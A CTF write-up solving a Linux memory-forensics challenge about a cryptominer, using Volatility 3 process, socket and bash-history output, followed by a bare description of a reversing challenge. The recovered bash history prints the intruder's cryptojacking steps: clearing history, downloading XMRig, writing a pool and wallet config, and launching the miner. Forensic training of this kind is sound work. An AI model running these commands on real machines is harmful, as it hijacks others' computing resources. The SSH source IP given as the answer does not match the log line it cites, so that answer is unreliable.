---
title: IEEE Jordan CTF 2025
tags : Reverse , Forensic
categories:
  - CTF 
---
# IEEE-Jordan-CTF-2025
Write up for hard DFIR and Medium Rev



## DFIR CryptoMiner Hunter ( First Blood )
We got a memory dump created using lime so its linux 

Desecrption : A Linux server was compromised with a cryptocurrency miner. Analyze the memory dump using Volatility 3 to uncover the attack details and submit your findings in JSON format.

So let's start with the first Quest.

 PPID of the malicious cryptocurrency miner ( lets first open the Vol3 and try pslist to identify the mallicious process and its Parent process ) 

The output of vol3:
```
─$ python3 volatility3/vol.py -f memory.lime linux.pslist                             
Volatility 3 Framework 2.27.0
Progress:  100.00               Stacking attempts finished           
OFFSET (V)      PID     TID     PPID    COMM    UID     GID     EUID    EGID    CREATION TIME   File output

0x9cdb0037a8c0  1       1       0       systemd 0       0       0       0       2025-10-09 19:45:50.308077 UTC  Disabled
0x9cdb00378000  2       2       0       kthreadd        0       0       0       0       2025-10-09 19:45:50.308077 UTC  Disabled
0x9cdb0037d180  3       3       2       pool_workqueue_ 0       0       0       0       2025-10-09 19:45:50.310077 UTC  Disabled
0x9cdb003ca8c0  4       4       2       kworker/R-rcu_g 0       0       0       0       2025-10-09 19:45:50.310077 UTC  Disabled
0x9cdb003c8000  5       5       2       kworker/R-rcu_p 0       0       0       0       2025-10-09 19:45:50.310077 UTC  Disabled
0x9cdb003cd180  6       6       2       kworker/R-slub_ 0       0       0       0       2025-10-09 19:45:50.310077 UTC  Disabled
0x9cdb003d0000  7       7       2       kworker/R-netns 0       0       0       0       2025-10-09 19:45:50.310077 UTC  Disabled
0x9cdb003da8c0  10      10      2       kworker/0:0H    0       0       0       0       2025-10-09 19:45:50.311077 UTC  Disabled
0x9cdb003dd180  12      12      2       kworker/R-mm_pe 0       0       0       0       2025-10-09 19:45:50.311077 UTC  Disabled
0x9cdb003e28c0  13      13      2       rcu_tasks_kthre 0       0       0       0       2025-10-09 19:45:50.313077 UTC  Disabled
0x9cdb003e0000  14      14      2       rcu_tasks_rude_ 0       0       0       0       2025-10-09 19:45:50.315077 UTC  Disabled
0x9cdb003e5180  15      15      2       rcu_tasks_trace 0       0       0       0       2025-10-09 19:45:50.317077 UTC  Disabled
0x9cdb00868000  16      16      2       ksoftirqd/0     0       0       0       0       2025-10-09 19:45:50.319077 UTC  Disabled
0x9cdb0086d180  17      17      2       rcu_preempt     0       0       0       0       2025-10-09 19:45:50.321077 UTC  Disabled
0x9cdb0086a8c0  18      18      2       migration/0     0       0       0       0       2025-10-09 19:45:50.321077 UTC  Disabled
0x9cdb0087a8c0  19      19      2       idle_inject/0   0       0       0       0       2025-10-09 19:45:50.322077 UTC  Disabled
0x9cdb00880000  20      20      2       cpuhp/0 0       0       0       0       2025-10-09 19:45:50.323077 UTC  Disabled
0x9cdb00885180  21      21      2       cpuhp/1 0       0       0       0       2025-10-09 19:45:50.324077 UTC  Disabled
0x9cdb008828c0  22      22      2       idle_inject/1   0       0       0       0       2025-10-09 19:45:50.324077 UTC  Disabled
0x9cdb00888000  23      23      2       migration/1     0       0       0       0       2025-10-09 19:45:50.324077 UTC  Disabled
0x9cdb0088d180  24      24      2       ksoftirqd/1     0       0       0       0       2025-10-09 19:45:50.324077 UTC  Disabled
0x9cdb00895180  26      26      2       kworker/1:0H    0       0       0       0       2025-10-09 19:45:50.324077 UTC  Disabled
0x9cdb008928c0  27      27      2       cpuhp/2 0       0       0       0       2025-10-09 19:45:50.326077 UTC  Disabled
0x9cdb00890000  28      28      2       idle_inject/2   0       0       0       0       2025-10-09 19:45:50.326077 UTC  Disabled
0x9cdb0089d180  29      29      2       migration/2     0       0       0       0       2025-10-09 19:45:50.326077 UTC  Disabled
0x9cdb0089a8c0  30      30      2       ksoftirqd/2     0       0       0       0       2025-10-09 19:45:50.326077 UTC  Disabled
0x9cdb009a28c0  32      32      2       kworker/2:0H    0       0       0       0       2025-10-09 19:45:50.326077 UTC  Disabled
0x9cdb009a0000  33      33      2       kdevtmpfs       0       0       0       0       2025-10-09 19:45:50.335077 UTC  Disabled
0x9cdb00a5d180  34      34      2       kworker/R-inet_ 0       0       0       0       2025-10-09 19:45:50.340077 UTC  Disabled
0x9cdb00b15180  36      36      2       kauditd 0       0       0       0       2025-10-09 19:45:50.365077 UTC  Disabled
0x9cdb00b128c0  37      37      2       khungtaskd      0       0       0       0       2025-10-09 19:45:50.385077 UTC  Disabled
0x9cdb009a5180  38      38      2       oom_reaper      0       0       0       0       2025-10-09 19:45:50.385077 UTC  Disabled
0x9cdb00bed180  39      39      2       kworker/R-write 0       0       0       0       2025-10-09 19:45:50.386077 UTC  Disabled
0x9cdb00bea8c0  41      41      2       kcompactd0      0       0       0       0       2025-10-09 19:45:50.387077 UTC  Disabled
0x9cdb00be8000  42      42      2       ksmd    0       0       0       0       2025-10-09 19:45:50.393077 UTC  Disabled
0x9cdb00bf0000  43      43      2       khugepaged      0       0       0       0       2025-10-09 19:45:50.395077 UTC  Disabled
0x9cdb00bf5180  44      44      2       kworker/R-kinte 0       0       0       0       2025-10-09 19:45:50.395077 UTC  Disabled
0x9cdb00bf28c0  45      45      2       kworker/R-kbloc 0       0       0       0       2025-10-09 19:45:50.395077 UTC  Disabled
0x9cdb00df8000  46      46      2       kworker/R-blkcg 0       0       0       0       2025-10-09 19:45:50.395077 UTC  Disabled
0x9cdb00dfd180  47      47      2       irq/9-acpi      0       0       0       0       2025-10-09 19:45:50.405077 UTC  Disabled
0x9cdb00f128c0  50      50      2       kworker/R-tpm_d 0       0       0       0       2025-10-09 19:45:50.921077 UTC  Disabled
0x9cdb00f10000  51      51      2       kworker/R-ata_s 0       0       0       0       2025-10-09 19:45:50.930077 UTC  Disabled
0x9cdb00f15180  52      52      2       kworker/R-md    0       0       0       0       2025-10-09 19:45:50.948077 UTC  Disabled
0x9cdb00f228c0  53      53      2       kworker/R-md_bi 0       0       0       0       2025-10-09 19:45:50.950077 UTC  Disabled
0x9cdb00b328c0  54      54      2       kworker/R-edac- 0       0       0       0       2025-10-09 19:45:50.953077 UTC  Disabled
0x9cdb00b30000  55      55      2       kworker/R-devfr 0       0       0       0       2025-10-09 19:45:50.953077 UTC  Disabled
0x9cdb0157d180  56      56      2       watchdogd       0       0       0       0       2025-10-09 19:45:50.969077 UTC  Disabled
0x9cdb01578000  59      59      2       kswapd0 0       0       0       0       2025-10-09 19:45:51.273814 UTC  Disabled
0x9cdb00f20000  60      60      2       ecryptfs-kthrea 0       0       0       0       2025-10-09 19:45:51.287354 UTC  Disabled
0x9cdb015928c0  61      61      2       kworker/R-kthro 0       0       0       0       2025-10-09 19:45:51.325965 UTC  Disabled
0x9cdb01590000  62      62      2       kworker/R-acpi_ 0       0       0       0       2025-10-09 19:45:51.364467 UTC  Disabled
0x9cdb01595180  63      63      2       scsi_eh_0       0       0       0       0       2025-10-09 19:45:51.677654 UTC  Disabled
0x9cdb015a5180  64      64      2       kworker/R-scsi_ 0       0       0       0       2025-10-09 19:45:51.678064 UTC  Disabled
0x9cdb015a28c0  65      65      2       scsi_eh_1       0       0       0       0       2025-10-09 19:45:51.707621 UTC  Disabled
0x9cdb015a0000  66      66      2       kworker/R-scsi_ 0       0       0       0       2025-10-09 19:45:51.710323 UTC  Disabled
0x9cdb00f25180  67      67      2       scsi_eh_2       0       0       0       0       2025-10-09 19:45:51.712076 UTC  Disabled
0x9cdb05618000  68      68      2       kworker/R-scsi_ 0       0       0       0       2025-10-09 19:45:51.721590 UTC  Disabled
0x9cdb055f28c0  71      71      2       kworker/1:1H    0       0       0       0       2025-10-09 19:45:51.977927 UTC  Disabled
0x9cdb0561d180  72      72      2       kworker/2:1H    0       0       0       0       2025-10-09 19:45:51.998478 UTC  Disabled
0x9cdb055f0000  73      73      2       kworker/R-mld   0       0       0       0       2025-10-09 19:45:52.069133 UTC  Disabled
0x9cdb0561a8c0  74      74      2       kworker/R-ipv6_ 0       0       0       0       2025-10-09 19:45:52.070288 UTC  Disabled
0x9cdb05630000  81      81      2       kworker/R-kstrp 0       0       0       0       2025-10-09 19:45:52.105461 UTC  Disabled
0x9cdb056328c0  83      83      2       kworker/u7:0    0       0       0       0       2025-10-09 19:45:52.197711 UTC  Disabled
0x9cdb0563d180  88      88      2       kworker/R-crypt 0       0       0       0       2025-10-09 19:45:52.218549 UTC  Disabled
0x9cdb05715180  98      98      2       kworker/R-charg 0       0       0       0       2025-10-09 19:45:52.311922 UTC  Disabled
0x9cdb0660d180  203     203     2       kworker/R-raid5 0       0       0       0       2025-10-09 19:45:55.171341 UTC  Disabled
0x9cdb066228c0  240     240     2       jbd2/sda1-8     0       0       0       0       2025-10-09 19:45:55.849199 UTC  Disabled
0x9cdb06620000  241     241     2       kworker/R-ext4- 0       0       0       0       2025-10-09 19:45:55.850684 UTC  Disabled
0x9cdb05d5a8c0  343     343     2       kworker/R-kmpat 0       0       0       0       2025-10-09 19:45:58.406199 UTC  Disabled
0x9cdb05d5d180  344     344     2       kworker/R-kmpat 0       0       0       0       2025-10-09 19:45:58.406255 UTC  Disabled
0x9cdb0169a8c0  474     474     2       jbd2/sda16-8    0       0       0       0       2025-10-09 19:46:00.268306 UTC  Disabled
0x9cdb02fea8c0  475     475     2       kworker/R-ext4- 0       0       0       0       2025-10-09 19:46:00.270161 UTC  Disabled
0x9cdbf1005180  814     814     1       dbus-daemon     101     101     101     101     2025-10-09 19:46:15.444355 UTC  Disabled
0x9cdb01730000  914     914     1       agetty  0       0       0       0       2025-10-09 19:46:16.369449 UTC  Disabled
0x9cdb05d58000  933     933     1       unattended-upgr 0       0       0       0       2025-10-09 19:46:16.434904 UTC  Disabled
0x9cdb0d550000  969     969     1       agetty  0       0       0       0       2025-10-09 19:46:16.586723 UTC  Disabled
0x9cdb3ab70000  4395    4395    1       udisksd 0       0       0       0       2025-10-09 19:48:24.846369 UTC  Disabled
0x9cdb017328c0  8495    8495    1       rsyslogd        102     102     102     102     2025-10-09 19:48:55.244953 UTC  Disabled
0x9cdb05c55180  12530   12530   1       cron    0       0       0       0       2025-10-09 19:49:27.134889 UTC  Disabled
0x9cdb05c50000  12544   12544   1       polkitd 989     989     989     989     2025-10-09 19:49:27.225786 UTC  Disabled
0x9cdb033f28c0  12545   12545   1       multipathd      0       0       0       0       2025-10-09 19:49:27.243814 UTC  Disabled
0x9cdb016bd180  12566   12566   1       ModemManager    0       0       0       0       2025-10-09 19:49:27.352871 UTC  Disabled
0x9cdb10b3d180  13522   13522   1       containerd      0       0       0       0       2025-10-09 19:50:11.281820 UTC  Disabled
0x9cdb3a8a5180  13656   13656   1       dockerd 0       0       0       0       2025-10-09 19:50:14.729304 UTC  Disabled
0x9cdb02fe28c0  13939   13939   1       sshd    0       0       0       0       2025-10-09 19:50:41.362751 UTC  Disabled
0x9cdb31668000  14777   14777   2       kworker/R-tls-s 0       0       0       0       2025-10-09 19:51:23.436406 UTC  Disabled
0x9cdbf10028c0  15793   15793   2       kworker/0:2H    0       0       0       0       2025-10-09 19:52:05.584452 UTC  Disabled
0x9cdb01ff28c0  15976   15976   1       nginx   0       0       0       0       2025-10-09 19:52:15.095065 UTC  Disabled
0x9cdb40caa8c0  17155   17155   1       fwupd   0       0       0       0       2025-10-09 20:14:39.933090 UTC  Disabled
0x9cdb3bae8000  17198   17198   1       gpg-agent       0       0       0       0       2025-10-09 20:14:42.031886 UTC  Disabled
0x9cdb064d0000  21907   21907   2       psimon  0       0       0       0       2025-10-10 12:34:46.523239 UTC  Disabled
0x9cdb1614a8c0  21920   21920   1       gunicorn        0       0       0       0       2025-10-10 12:34:46.924136 UTC  Disabled
0x9cdb16148000  21927   21927   21920   gunicorn        0       0       0       0       2025-10-10 12:34:47.174980 UTC  Disabled
0x9cdb3166d180  21928   21928   21920   gunicorn        0       0       0       0       2025-10-10 12:34:47.267972 UTC  Disabled
0x9cdb3ab728c0  21929   21929   21920   gunicorn        0       0       0       0       2025-10-10 12:34:47.312924 UTC  Disabled
0x9cdb40d38000  21936   21936   15976   nginx   33      33      33      33      2025-10-10 12:34:51.949842 UTC  Disabled
0x9cdb40d3d180  21937   21937   15976   nginx   33      33      33      33      2025-10-10 12:34:51.950263 UTC  Disabled
0x9cdb05165180  21938   21938   15976   nginx   33      33      33      33      2025-10-10 12:34:51.950572 UTC  Disabled
0x9cdb00b10000  24207   24207   1       systemd-journal 0       0       0       0       2025-10-10 22:46:22.461665 UTC  Disabled
0x9cdb06608000  24209   24209   1       systemd-resolve 991     991     991     991     2025-10-10 22:46:22.477777 UTC  Disabled
0x9cdb05160000  24210   24210   1       systemd-timesyn 996     996     996     996     2025-10-10 22:46:22.492812 UTC  Disabled
0x9cdb0157a8c0  24211   24211   1       systemd-udevd   0       0       0       0       2025-10-10 22:46:22.497187 UTC  Disabled
0x9cdb40d3a8c0  24213   24213   1       systemd-logind  0       0       0       0       2025-10-10 22:46:22.543547 UTC  Disabled
0x9cdb0563a8c0  24222   24222   2       psimon  0       0       0       0       2025-10-10 22:46:22.760556 UTC  Disabled
0x9cdb10b65180  24223   24223   1       systemd-network 998     998     998     998     2025-10-10 22:46:22.764179 UTC  Disabled
0x9cdb02fe5180  27851   27851   2       kworker/2:0     0       0       0       0       2025-10-11 00:30:13.571550 UTC  Disabled
0x9cdb003d5180  27967   27967   2       kworker/u6:1    0       0       0       0       2025-10-11 00:40:18.274947 UTC  Disabled
0x9cdb0169d180  28143   28143   2       kworker/u6:2    0       0       0       0       2025-10-11 00:47:11.458466 UTC  Disabled
0x9cdbf1000000  28168   28168   2       kworker/2:1     0       0       0       0       2025-10-11 00:50:25.480311 UTC  Disabled
0x9cdb10b628c0  28261   28261   2       kworker/1:2     0       0       0       0       2025-10-11 01:00:15.277399 UTC  Disabled
0x9cdb3baea8c0  28299   28299   2       kworker/0:3     0       0       0       0       2025-10-11 01:01:33.228393 UTC  Disabled
0x9cdb01698000  28316   28316   2       kworker/0:1     0       0       0       0       2025-10-11 01:08:22.999773 UTC  Disabled
0x9cdb16048000  28404   28404   2       kworker/1:1     0       0       0       0       2025-10-11 01:10:40.469645 UTC  Disabled
0x9cdb1614d180  28406   28406   2       kworker/u6:0    0       0       0       0       2025-10-11 01:10:45.602368 UTC  Disabled
0x9cdb3baed180  28426   28426   1       systemd 0       0       0       0       2025-10-11 01:13:40.445700 UTC  Disabled
0x9cdb00dfa8c0  28427   28427   28426   (sd-pam)        0       0       0       0       2025-10-11 01:13:40.463235 UTC  Disabled
0x9cdb05710000  28432   28432   2       psimon  0       0       0       0       2025-10-11 01:13:40.712508 UTC  Disabled
0x9cdb01ff5180  28556   28556   13939   sshd    0       0       0       0       2025-10-11 01:14:12.200327 UTC  Disabled
0x9cdb0d54d180  28606   28606   28556   bash    0       0       0       0       2025-10-11 01:14:16.190222 UTC  Disabled
0x9cdb01ff0000  28640   28640   2       kworker/0:0     0       0       0       0       2025-10-11 01:14:37.799305 UTC  Disabled
0x9cdb05638000  28883   28883   2       kworker/2:2     0       0       0       0       2025-10-11 01:14:38.686239 UTC  Disabled
0x9cdb003d8000  29017   29017   1       packagekitd     0       0       0       0       2025-10-11 01:14:39.461968 UTC  Disabled
0x9cdb00a58000  29434   29434   28606   xmrig   0       0       0       0       2025-10-11 01:15:14.933669 UTC  Disabled
0x9cdb109f28c0  29451   29451   28606   sudo    0       0       0       0       2025-10-11 01:15:45.092644 UTC  Disabled
0x9cdb00b35180  29452   29452   29451   sudo    0       0       0       0       2025-10-11 01:15:45.172774 UTC  Disabled
0x9cdb05c828c0  29453   29453   29452   insmod  0       0       0       0       2025-10-11 01:15:45.178919 UTC  Disabled
                                                                                                                                                                                                             
```
i have done a fast resarch to each of them and found that "xmgir" and found a page that told its a Cryptojacking : https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/xmrig-malware/
so its the malware so, the PID and PPID of it as shown -> PPID : 28606 , PID : 29434 
#### The second quest. : Exact UTC timestamp when malicious process was created 
0x9cdb00a58000  29434   29434   28606   xmrig   0       0       0       0       2025-10-11 01:15:14.933669 UTC  Disabled
as it 
 "ppid": "28606",
  "timestamp": "2025-10-11_01:15:14"
#### Third quest. : Destination IP:PORT the miner connected to
i have done a fast -h so i can see which plugin for this purpose  and specify the PID of the process we want 
```
ython3 volatility3/vol.py -f memory.lime sockstat | grep 29434 
[1]  + killed     python3 volatility3/vol.py -f memory.lime sockstat 
4026531840      xmrig   29434   29434   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      iou-sqp-29434   29434   29436   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29437   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29438   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29439   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29440   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29441   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29445   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29446   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
4026531840      xmrig   29434   29447   15      0x9cdba1f33780  AF_INET STREAM  TCP     178.18.253.193  33220   46.4.28.18      443     ESTABLISHED     -
```
SO the IP:PORT -> 46.4.28.18:443
#### Forth quest. : Full command line with all arguments -> in this i tried linux.bash and found the following 
```
└─$ python3 volatility3/vol.py -f memory.lime  linux.bash             
Volatility 3 Framework 2.27.0
Progress:  100.00               Stacking attempts finished           
PID     Process CommandTime     Command

28606   bash    2025-10-11 01:14:16.000000 UTC  cat /dev/null > ~/.bash_history
28606   bash    2025-10-11 01:14:16.000000 UTC  exit
28606   bash    2025-10-11 01:14:17.000000 UTC  clear
28606   bash    2025-10-11 01:14:18.000000 UTC  l
28606   bash    2025-10-11 01:14:37.000000 UTC  # Install dependencies
28606   bash    2025-10-11 01:14:37.000000 UTC  apt update
28606   bash    2025-10-11 01:14:54.000000 UTC  apt install -y build-essential linux-headers-$(uname -r) git
28606   bash    2025-10-11 01:14:56.000000 UTC  cd /tmp
28606   bash    2025-10-11 01:14:56.000000 UTC  git clone https://github.com/504ensicsLabs/LiME
28606   bash    2025-10-11 01:14:56.000000 UTC  # Install LiME
28606   bash    2025-10-11 01:14:57.000000 UTC  make
28606   bash    2025-10-11 01:14:57.000000 UTC  cd LiME/src
28606   bash    2025-10-11 01:15:14.000000 UTC  wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
28606   bash    2025-10-11 01:15:14.000000 UTC  # Setup miner
28606   bash    2025-10-11 01:15:14.000000 UTC  tar -xf xmrig-6.22.0-linux-static-x64.tar.gz
28606   bash    2025-10-11 01:15:14.000000 UTC  cd /opt/miner
28606   bash    2025-10-11 01:15:14.000000 UTC  mv xmrig-6.22.0/xmrig .
28606   bash    2025-10-11 01:15:14.000000 UTC  mkdir -p /opt/miner
28606   bash    2025-10-11 01:15:14.000000 UTC  chmod +x xmrig
28606   bash    2025-10-11 01:15:14.000000 UTC  nohup ./xmrig --config=config.json > /dev/null 2>&1 &
28606   bash    2025-10-11 01:15:14.000000 UTC  cat > config.json << 'EOF'
{
    "pools": [{
        "url": "pool.hashvault.pro:443",
        "user": "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD",
        "pass": "x"
    }]
}
EOF

28606   bash    2025-10-11 01:15:14.000000 UTC  # Run miner
28606   bash    2025-10-11 01:15:14.000000 UTC  sleep 30
28606   bash    2025-10-11 01:15:45.000000 UTC  # Capture with LiME
28606   bash    2025-10-11 01:15:45.000000 UTC  sudo insmod lime-$(uname -r).ko "path=/root/memory-lime.lime format=lime"
28606   bash    2025-10-11 01:15:45.000000 UTC  ps aux | grep xmrig
28606   bash    2025-10-11 01:15:45.000000 UTC  cd /tmp/LiME/src
```
So as we see we got "./xmrig --config=config.json" as a main command and for the ## Fifth quest ->  /opt/miner
#### Sixth Quest. : What cryptocurrency was being mined -> just search for the url and you get the Monero is the answer 
#### Seveth Quest. : Attacker cryptocurrency wallet address the answer is the user in the pools config "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD"
#### eighth Quest. : FQDN of the mining pool server -> The answer also from the pools config -> pool.hashvault.pro 
#### Ninth Quest. : Source IP that established the SSH session -> in this i tried strings for " Accepted | sshd " YOU should be aware from the timestamp to differ between multi ssh's 
```
2025-10-11T02:32:16.020297+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 20 seq 4 [preauth]
2025-10-11T02:32:16.020658+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 30 seq 5 [preauth]
2025-10-11T02:32:17.997896+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 20 seq 6 [preauth]
2025-10-11T02:32:17.998304+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 30 seq 7 [preauth]
2025-10-11T02:32:44.003073+02:00 vmi2849587 sshd[27883]: Connection reset by 147.139.164.196 port 6103 [preauth]
2025-10-11T02:35:55.351641+02:00 vmi2849587 sshd[27899]: Accepted password for root from 94.249.91.54 port 37905 ssh2
2025-10-11T02:35:55.357369+02:00 vmi2849587 sshd[27899]: pam_unix(sshd:session): session opened for user root(uid=0) by root(uid=0)
2025-10-11T02:38:03.040188+02:00 vmi2849587 sshd[27957]: Invalid user validator from 193.32.162.145 port 40896
2025-10-11T02:38:03.088425+02:00 vmi2849587 sshd[27957]: pam_unix(sshd:auth): check pass; user unknown
2025-10-11T02:38:03.088734+02:00 vmi2849587 sshd[27957]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.32.162.145 
2025-10-11T02:38:05.554760+02:00 vmi2849587 sshd[27957]: Failed password for invalid user validator from 193.32.162.145 port 40896 ssh2
2025-10-11T02:38:07.011132+02:00 vmi2849587 sshd[27957]: Connection closed by invalid user validator 193.32.162.145 port 40896 [preauth]
2025-10-11T02:38:29.505820+02:00 vmi2849587 sshd[27960]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:31.536952+02:00 vmi2849587 sshd[27960]: Failed password for root from 193.46.255.103 port 33638 ssh2
2025-10-11T02:38:37.587857+02:00 vmi2849587 sshd[27960]: message repeated 2 times: [ Failed password for root from 193.46.255.103 port 33638 ssh2]
2025-10-11T02:38:37.736020+02:00 vmi2849587 sshd[27960]: Received disconnect from 193.46.255.103 port 33638:11:  [preauth]
2025-10-11T02:38:37.736370+02:00 vmi2849587 sshd[27960]: Disconnected from authenticating user root 193.46.255.103 port 33638 [preauth]
2025-10-11T02:38:37.736847+02:00 vmi2849587 sshd[27960]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:38.076376+02:00 vmi2849587 sshd[27962]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:39.871690+02:00 vmi2849587 sshd[27962]: Failed password for root from 193.46.255.103 port 26944 ssh2
2025-10-11T02:38:46.076094+02:00 vmi2849587 sshd[27962]: message repeated 2 times: [ Failed password for root from 193.46.255.103 port 26944 ssh2]
2025-10-11T02:38:46.314124+02:00 vmi2849587 sshd[27962]: Received disconnect from 193.46.255.103 port 26944:11:  [preauth]
2025-10-11T02:38:46.314489+02:00 vmi2849587 sshd[27962]: Disconnected from authenticating user root 193.46.255.103 port 26944 [preauth]
2025-10-11T02:38:46.317143+02:00 vmi2849587 sshd[27962]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:46.682226+02:00 vmi2849587 sshd[27964]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:48.714466+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:53.105156+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:57.454448+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:59.034448+02:00 vmi2849587 sshd[27964]: Received discon
MESSAGE=Accepted password for root from 104.28.248.39 port 12642 ssh2
2025-10-11T02:32:16.020297+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 20 seq 4 [preauth]
2025-10-11T02:32:16.020658+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 30 seq 5 [preauth]
2025-10-11T02:32:17.997896+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 20 seq 6 [preauth]
2025-10-11T02:32:17.998304+02:00 vmi2849587 sshd[27883]: error: kex_protocol_error: type 30 seq 7 [preauth]
2025-10-11T02:32:44.003073+02:00 vmi2849587 sshd[27883]: Connection reset by 147.139.164.196 port 6103 [preauth]
2025-10-11T02:35:55.351641+02:00 vmi2849587 sshd[27899]: Accepted password for root from 94.249.91.54 port 37905 ssh2
2025-10-11T02:35:55.357369+02:00 vmi2849587 sshd[27899]: pam_unix(sshd:session): session opened for user root(uid=0) by root(uid=0)
2025-10-11T02:38:03.040188+02:00 vmi2849587 sshd[27957]: Invalid user validator from 193.32.162.145 port 40896
2025-10-11T02:38:03.088425+02:00 vmi2849587 sshd[27957]: pam_unix(sshd:auth): check pass; user unknown
2025-10-11T02:38:03.088734+02:00 vmi2849587 sshd[27957]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.32.162.145 
2025-10-11T02:38:05.554760+02:00 vmi2849587 sshd[27957]: Failed password for invalid user validator from 193.32.162.145 port 40896 ssh2
2025-10-11T02:38:07.011132+02:00 vmi2849587 sshd[27957]: Connection closed by invalid user validator 193.32.162.145 port 40896 [preauth]
2025-10-11T02:38:29.505820+02:00 vmi2849587 sshd[27960]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:31.536952+02:00 vmi2849587 sshd[27960]: Failed password for root from 193.46.255.103 port 33638 ssh2
2025-10-11T02:38:37.587857+02:00 vmi2849587 sshd[27960]: message repeated 2 times: [ Failed password for root from 193.46.255.103 port 33638 ssh2]
2025-10-11T02:38:37.736020+02:00 vmi2849587 sshd[27960]: Received disconnect from 193.46.255.103 port 33638:11:  [preauth]
2025-10-11T02:38:37.736370+02:00 vmi2849587 sshd[27960]: Disconnected from authenticating user root 193.46.255.103 port 33638 [preauth]
2025-10-11T02:38:37.736847+02:00 vmi2849587 sshd[27960]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:38.076376+02:00 vmi2849587 sshd[27962]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:39.871690+02:00 vmi2849587 sshd[27962]: Failed password for root from 193.46.255.103 port 26944 ssh2
2025-10-11T02:38:46.076094+02:00 vmi2849587 sshd[27962]: message repeated 2 times: [ Failed password for root from 193.46.255.103 port 26944 ssh2]
2025-10-11T02:38:46.314124+02:00 vmi2849587 sshd[27962]: Received disconnect from 193.46.255.103 port 26944:11:  [preauth]
2025-10-11T02:38:46.314489+02:00 vmi2849587 sshd[27962]: Disconnected from authenticating user root 193.46.255.103 port 26944 [preauth]
2025-10-11T02:38:46.317143+02:00 vmi2849587 sshd[27962]: PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:46.682226+02:00 vmi2849587 sshd[27964]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.46.255.103  user=root
2025-10-11T02:38:48.714466+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:53.105156+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:57.454448+02:00 vmi2849587 sshd[27964]: Failed password for root from 193.46.255.103 port 54468 ssh2
2025-10-11T02:38:59.034448+02:00 vmi2849587 sshd[27964]: Received discon
```
I found among these ssh a Line with " MESSAGE=..." , i thought maybe this from config or the ssh he was done because its without timestamp and the other is not from the attack time 
so Ans = 104.28.216.42
#### Tenth Quest. : Kernel module loaded during incident  : From the linux.bash we found that is "lime" as he load it while the attack 
#### elevth Quest. : PID of the malicious miner process : From the first pslist its "29434"
#### Final Quest.  : Complete process chain from sshd to miner : so the attack started through sshd then bash then the xmgir so  ( sshd -> bash -> xmgir ) you can identify it using pslist 



## Rev Echoes of Rick ( Second Blood )
Description
Rick left another obfuscated loader that rebuilds a hidden message from scrambled 4‑byte chunks. Your task: reverse the program and recover the hidden flag using static and dynamic analysis techniques.
